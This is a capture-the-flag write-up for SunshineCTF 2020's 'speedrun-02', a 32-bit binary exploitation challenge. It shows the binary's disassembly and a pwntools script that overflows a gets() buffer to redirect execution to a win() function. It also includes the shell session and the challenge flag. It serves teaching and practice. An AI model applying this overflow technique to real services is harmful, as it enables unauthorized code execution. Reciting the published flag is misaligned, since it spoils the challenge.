# speedrun-02

## Task

nc chal.2020.sunshinectf.org 30002

Tags: binary exploitation

## Solution

In contrast to the two previous challenges, this one is a 32 bit binary. We no longer have a comparison to a fixed value.

```nasm
[0x080483c0]> afl
0x080483c0    1 50           entry0
0x080483f3    1 4            fcn.080483f3
0x080483a0    1 6            sym.imp.__libc_start_main
0x08048420    4 50   -> 41   sym.deregister_tm_clones
0x08048460    4 58   -> 54   sym.register_tm_clones
0x080484a0    3 34   -> 31   sym.__do_global_dtors_aux
0x080484d0    1 6            entry.init0
0x080485f0    1 2            sym.__libc_csu_fini
0x08048410    1 4            sym.__x86.get_pc_thunk.bx
0x08048501    1 40           sym.vuln
0x08048582    1 4            sym.__x86.get_pc_thunk.ax
0x08048360    1 6            sym.imp.gets
0x080485f4    1 20           sym._fini
0x08048590    4 93           sym.__libc_csu_init
0x080484d6    1 43           sym.win
0x08048390    1 6            sym.imp.system
0x08048400    1 2            sym._dl_relocate_static_pie
0x08048529    1 89           main
0x08048380    1 6            sym.imp.puts
0x08048370    1 6            sym.imp.fgets
0x08048324    3 35           sym._init
[0x080483c0]> pdf@main
            ; DATA XREFS from entry0 @ 0x80483e6, 0x80483ec
┌ 89: int main (char **argv);
│           ; var char *s @ ebp-0x1c
│           ; var int32_t var_8h @ ebp-0x8
│           ; arg char **argv @ esp+0x44
│           0x08048529      8d4c2404       lea ecx, [argv]
│           0x0804852d      83e4f0         and esp, 0xfffffff0
│           0x08048530      ff71fc         push dword [ecx - 4]
│           0x08048533      55             push ebp
│           0x08048534      89e5           mov ebp, esp
│           0x08048536      53             push ebx
│           0x08048537      51             push ecx
│           0x08048538      83ec20         sub esp, 0x20
│           0x0804853b      e8d0feffff     call sym.__x86.get_pc_thunk.bx
│           0x08048540      81c3c01a0000   add ebx, 0x1ac0
│           0x08048546      83ec0c         sub esp, 0xc
│           0x08048549      8d8318e6ffff   lea eax, [ebx - 0x19e8]
│           0x0804854f      50             push eax                    ; const char *s
│           0x08048550      e82bfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048555      83c410         add esp, 0x10
│           0x08048558      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x0804855e      8b00           mov eax, dword [eax]
│           0x08048560      83ec04         sub esp, 4
│           0x08048563      50             push eax                    ; FILE *stream
│           0x08048564      6a13           push 0x13                   ; 19 ; int size
│           0x08048566      8d45e4         lea eax, [s]
│           0x08048569      50             push eax                    ; char *s
│           0x0804856a      e801feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0804856f      83c410         add esp, 0x10
│           0x08048572      e88affffff     call sym.vuln
│           0x08048577      90             nop
│           0x08048578      8d65f8         lea esp, [var_8h]
│           0x0804857b      59             pop ecx
│           0x0804857c      5b             pop ebx
│           0x0804857d      5d             pop ebp
│           0x0804857e      8d61fc         lea esp, [ecx - 4]
└           0x08048581      c3             ret
[0x080483c0]> pdf@sym.vuln
            ; CALL XREF from main @ 0x8048572
┌ 40: sym.vuln ();
│           ; var char *s @ ebp-0x3a
│           ; var int32_t var_4h @ ebp-0x4
│           0x08048501      55             push ebp
│           0x08048502      89e5           mov ebp, esp
│           0x08048504      53             push ebx
│           0x08048505      83ec44         sub esp, 0x44
│           0x08048508      e875000000     call sym.__x86.get_pc_thunk.ax
│           0x0804850d      05f31a0000     add eax, 0x1af3
│           0x08048512      83ec0c         sub esp, 0xc
│           0x08048515      8d55c6         lea edx, [s]
│           0x08048518      52             push edx                    ; char *s
│           0x08048519      89c3           mov ebx, eax
│           0x0804851b      e840feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x08048520      83c410         add esp, 0x10
│           0x08048523      90             nop
│           0x08048524      8b5dfc         mov ebx, dword [var_4h]
│           0x08048527      c9             leave
└           0x08048528      c3             ret
[0x080483c0]> pdf@sym.win
┌ 43: sym.win ();
│           ; var int32_t var_4h @ ebp-0x4
│           0x080484d6      55             push ebp
│           0x080484d7      89e5           mov ebp, esp
│           0x080484d9      53             push ebx
│           0x080484da      83ec04         sub esp, 4
│           0x080484dd      e8a0000000     call sym.__x86.get_pc_thunk.ax
│           0x080484e2      051e1b0000     add eax, 0x1b1e
│           0x080484e7      83ec0c         sub esp, 0xc
│           0x080484ea      8d9010e6ffff   lea edx, [eax - 0x19f0]
│           0x080484f0      52             push edx                    ; const char *string
│           0x080484f1      89c3           mov ebx, eax
│           0x080484f3      e898feffff     call sym.imp.system         ; int system(const char *string)
│           0x080484f8      83c410         add esp, 0x10
│           0x080484fb      90             nop
│           0x080484fc      8b5dfc         mov ebx, dword [var_4h]
│           0x080484ff      c9             leave
└           0x08048500      c3             ret
```

We have a `vuln` function using `gets` again and a `win` function that is never called. So we have to overflow the stack in `vuln` to overwrite the return address to jump to `win` when we reach `ret` in the `vuln` function.

There is some stack-pointer calculation going on. It's not only `0x44`, before `gets` we subtract another `0xc`. In the `main` function there is actually a call to `fgets` before that but handling that resulted in the exploit not working.

Sending just one line worked fine:

```python
from pwn import *

elf = ELF("./chall_02", checksec=False)

payload  = 'A' * (0x44 + 0xc)
payload += p32(elf.symbols["win"])

p = remote('chal.2020.sunshinectf.org', 30002)
#p = process("./chall_02")

p.sendline(payload)
p.interactive()
```

```bash
$ python2 chall00.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30002: Done
[*] Switching to interactive mode
Went along the mountain side.
$ ls
chall_02
flag.txt
$ cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
```
